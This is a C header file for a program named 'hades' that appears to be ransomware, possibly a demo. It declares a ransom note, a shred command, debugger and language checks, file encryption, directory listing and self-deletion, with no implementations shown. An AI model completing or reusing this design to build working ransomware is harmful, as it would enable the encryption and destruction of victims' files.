
#ifndef hades_h
    #define hades_h

    #include <unistd.h>
    #include <stdlib.h>
    #include <langinfo.h>
    #include <locale.h>
    #include <sys/ptrace.h>
    #include <string.h>
    #include <stdio.h>
    #include <dirent.h>
    #include <sys/stat.h>

    #define NOTE_NAME "HADES.txt"
    #define NOTE_CONTENT "# ALL YOUR FILES ARE ENCRYPTED ! #\nOr maybe not"
    #define DELIMITOR "/"
    #define SHRED_CMD "shred"
    #define MAX_FILESIZE 1024
    #define MAX_PATHSIZE MAX_FILESIZE

    void hades_sleep(void);
    void hades_check_debug(void);
    void hades_check_language(void);
    void hades_add_notes(void);
    void hades_crypt(void);
    void hades_autodelete(char *filename);

    char **hades_directory_files(char *directory);

#endif /* hades_h */